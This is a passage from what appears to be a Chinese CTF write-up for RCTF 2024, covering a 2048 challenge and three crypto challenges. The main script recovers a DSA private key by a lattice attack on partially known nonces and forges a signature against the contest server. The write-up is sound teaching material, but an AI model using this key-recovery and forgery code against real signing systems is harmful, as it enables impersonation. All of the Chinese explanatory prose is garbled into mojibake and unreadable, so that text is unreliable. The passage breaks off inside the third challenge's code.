</span></span></code></pre></td></tr></table></div></div><h2 id=2048>2048</h2><p>åˆå§‹10000åˆ†ï¼Œæœ€ç»ˆè¦1000000åˆ†ï¼Œæ¯æ¬¡èµ¢ä¸€ç›˜æœ€å¤šåŠ å½“å‰çš„åˆ†æ•°</p><p>å¤§æ¦‚ç©åå‡ é2048å°±å¯ä»¥äº†ï¼ˆæ³ªç›®ï¼‰</p><p><img src=/img/2024-05-27-RCTF/968092825888ad31e980ebd3d5450648.png alt></p><h1 id=crypto>Crypto</h1><h2 id=signsystem>SignSystem</h2><p>$$ \begin{aligned} k \cdot s &= hm + x \cdot r \ \text{msb} | k | \text{lsb} &= (hm + x \cdot r) \cdot s^{-1} \end{aligned} $$
$$
\begin{aligned}
&\text{msb}: 8\text{-bit}, \quad \text{lsb}: 2\text{-bit} \
&amp;x: 160\text{-bit}, \quad k: 150\text{-bit}
\end{aligned}
$$
å·²çŸ¥s,r,hmã€‚å¯çˆ†ç ´msbå’Œlsbï¼Œç”¨19ç»„æ¥å°è¯•è§„çº¦å‡ºkã€‚è¿™é‡Œç”±äºæ•°æ®å’Œlsbçš„ä½æ•°æœ‰å…³ï¼Œç›´æ¥çˆ†ç ´lsbé»˜è®¤ä¸º2bitï¼ˆ2ï¼Œ3ä¸¤ä¸ªå–å€¼ï¼‰ã€‚è¿˜æœ‰å°±æ˜¯å½“msbä¸ºè¾ƒå¤§çš„8bitæ•°æ—¶æ¦‚ç‡è¾ƒé«˜ï¼Œæ‰€ä»¥ç®€å•åšç§»ä½ï¼Œç„¶ååŸå§‹çš„æ ¼å°±èƒ½å‡ºxç„¶åä¼ªé€ ç›®æ ‡ç­¾åã€‚</p><p>$$ k = (hm \cdot s^{-1} - \text{msb} - \text{lsb}) \cdot 4^{-1} + x \cdot r \cdot (4s)^{-1} $$</p><p>Exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># -*- coding utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># @Time : 2024/5/25 15:11</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>getrandbits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>inverse</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_ephemeral_key</span><span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>lsb</span><span class=p>,</span> <span class=n>msb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>msb</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>k</span> <span class=o>+</span> <span class=n>lsb</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span> <span class=o>|</span> <span class=n>getrandbits</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>lsb</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>|</span> <span class=n>lsb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sign</span><span class=p>(</span><span class=n>pubkey</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>msg</span><span class=p>,</span> <span class=n>lsb</span><span class=p>,</span> <span class=n>msb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>pubkey</span>
</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=n>gen_ephemeral_key</span><span class=p>(</span><span class=mi>150</span><span class=p>,</span> <span class=n>lsb</span><span class=p>,</span> <span class=n>msb</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>g</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>Hm</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sha1</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=n>Hm</span> <span class=o>+</span> <span class=n>x</span> <span class=o>*</span> <span class=n>r</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>q</span><span class=p>)</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;121.37.182.7&#39;</span><span class=p>,</span><span class=mi>10089</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[</span><span class=mi>13</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>pub</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>pub</span>
</span></span><span class=line><span class=cl>    <span class=n>GG</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Ms</span> <span class=o>=</span> <span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>19</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>rr</span><span class=p>,</span><span class=n>ss</span> <span class=o>=</span> <span class=p>[],[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>19</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Which message to sign?: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>Ms</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span><span class=n>s</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[</span><span class=mi>11</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=n>rr</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ss</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>msb</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>192</span><span class=p>,</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>msb</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>lsb</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            <span class=n>B</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span> <span class=o>=</span> <span class=p>(</span><span class=n>msb</span><span class=o>&lt;&lt;</span><span class=mi>152</span><span class=p>)</span><span class=o>+</span><span class=n>lsb</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>19</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>Hm</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sha1</span><span class=p>(</span><span class=n>Ms</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>A</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>ss</span><span class=p>[</span><span class=n>i</span><span class=p>],</span><span class=n>q</span><span class=p>)</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>q</span><span class=p>)</span> <span class=o>%</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>B</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>Hm</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>ss</span><span class=p>[</span><span class=n>i</span><span class=p>],</span><span class=n>q</span><span class=p>)</span><span class=o>-</span> <span class=n>K</span><span class=p>)</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>q</span><span class=p>)</span> <span class=o>%</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>QQ</span><span class=p>,</span><span class=mi>21</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>19</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>                <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>B</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=o>/</span><span class=mi>2</span><span class=o>^</span><span class=mi>10</span>
</span></span><span class=line><span class=cl>            <span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>150</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>=</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span><span class=o>*</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>y</span> <span class=o>==</span> <span class=n>ZZ</span><span class=p>(</span><span class=n>GG</span><span class=p>(</span><span class=n>g</span><span class=p>)</span><span class=o>^</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=p>,</span><span class=n>s</span> <span class=o>=</span> <span class=n>sign</span><span class=p>(</span><span class=n>pub</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;get flag&#34;</span><span class=p>,</span> <span class=n>lsb</span><span class=p>,</span> <span class=n>msb</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Which message to verify?: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;get flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;r:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>r</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;s:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=hello-xctf>Hello, XCTF!</h2><p>ç›®æ ‡åœ¨b&rsquo;XCTFxctf&rsquo;ç»„æˆä¸€ä¸ª64é•¿åº¦çš„å­—ç¬¦ä¸²sï¼Œæ»¡è¶³s+b&rsquo;$&rsquo;%p=b&rsquo;hello&rsquo;ï¼Œpä¸ºè‡ªå·±è®¾å®šçš„100ä½ç´ æ•°ã€‚</p><p>$$\sum_{i=1}^{64}256^i*s_i=hello-$\mod p$$</p><p>ç›®æ ‡å­—ç¬¦ä¸²å·®è·è¿‡å¤§ï¼Œè€ƒè™‘ä½¿ç”¨çº¿æ€§ç»„åˆä¼˜åŒ–ç›®æ ‡å‘é‡ã€‚å‚è€ƒNSSCTF-easy_mod</p><p>å‘ç°ä»…æœ‰Xtfæœ‰è‰¯å¥½çš„çº¿æ€§å…³ç³»ï¼ˆ-1ï¼Œ0ï¼Œ1ï¼‰</p><p>è€ƒè™‘çˆ†ç ´ä¸åŒpæ¥å¾—åˆ°ä¸€ç»„è§£</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span><span class=mi>14</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>448378203211</span> <span class=c1>#hello-$</span>
</span></span><span class=line><span class=cl><span class=n>table</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;Xft&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#part1 linear transformation and remove prefix and suffix</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>table</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>-</span> <span class=n>a</span><span class=o>*</span><span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=p>,</span><span class=n>b</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>((</span><span class=n>a</span><span class=o>*</span><span class=n>table</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>+</span><span class=n>b</span><span class=p>)</span><span class=o>%</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>c</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=mi>256</span><span class=p>,</span><span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>a</span><span class=o>*</span><span class=n>c</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>length</span> <span class=o>=</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span><span class=n>length</span><span class=o>+</span><span class=mi>2</span><span class=p>,</span><span class=n>length</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>256</span><span class=o>^</span><span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>+=</span> <span class=mi>256</span><span class=o>^</span><span class=n>i</span><span class=o>*</span><span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>%=</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>-</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=p>[:,</span><span class=o>-</span><span class=mi>1</span><span class=p>:]</span> <span class=o>*=</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>L</span><span class=o>.</span><span class=n>BKZ</span><span class=p>(</span><span class=n>block_size</span><span class=o>=</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>res</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>i</span><span class=p>[:</span><span class=o>-</span><span class=mi>2</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s2>&#34;X&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span><span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s2>&#34;t&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span><span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s2>&#34;f&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span><span class=p>(</span><span class=n>j</span><span class=o>==</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s2>&#34;J&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=s2>&#34;$&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#     print(len(flag))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=o>%</span> <span class=n>p</span> <span class=o>==</span> <span class=mi>448378203247</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># p = 959011088180926180839552561337</span>
</span></span><span class=line><span class=cl><span class=c1># flag = fXXftfffttftXfftfffXtftffXXXfffXttXXffftXftttXfXftfftXttffXffttt$</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=d>DÂ³</h2><p>ç®€å•è¯´é¢˜ç›®è¦æ±‚ç»™å‡ºä¸‰ä¸ªè§£å¯†æ–¹å¼éƒ½èƒ½å®Œæˆè§£å¯†ã€‚</p><p>ç¬¬ä¸€ç§ï¼šæ ‡å‡†è§£å¯†ï¼Œä¸ç”¨è€ƒè™‘ã€‚</p><p>ç¬¬äºŒç§ï¼š$$d=e^k\mod phi,phi=(p-1)*(q-1)$$</p><p>ç¬¬ä¸‰ç§ï¼š$$d=e^k\mod phi,phi=lcm(p-1,q-1)$$</p><p>kä¸ºæŒ‡å®šçš„ä¸€ä¸ªæ•°ï¼Œå¯åœ¨factordbåˆ†è§£æˆå¤šä¸ªç´ æ•°</p><p>è¿™é‡Œå¾ˆæ˜¾ç„¶åä¸¤ç§æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥é¢˜ç›®ç®€åŒ–ä¸ºï¼š</p><p>$$m^{e*d}=m\mod n\m^{e^{k+1}\mod phi}=m\mod n$$</p><p>èƒ½å¤Ÿæ»¡è¶³æ¡ä»¶çš„è¦æ±‚ï¼š$$k+1|\phi(phi)$$ã€‚k+1çš„ç´ å› å­ä¸º17ä¸ªï¼Œå¯ä»¥ç©·ä¸¾ä¸€ä¸‹ç»„åˆå¾—åˆ°æ»¡è¶³æ¡ä»¶çš„phiçš„ç´ å› å­ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>proof</span><span class=o>.</span><span class=n>all</span><span class=p>(</span><span class=kc>False</span><span class=p>)</span> <span class=c1># speed up primality checking a bit</span>
</span></span><span class=line><span class=cl>
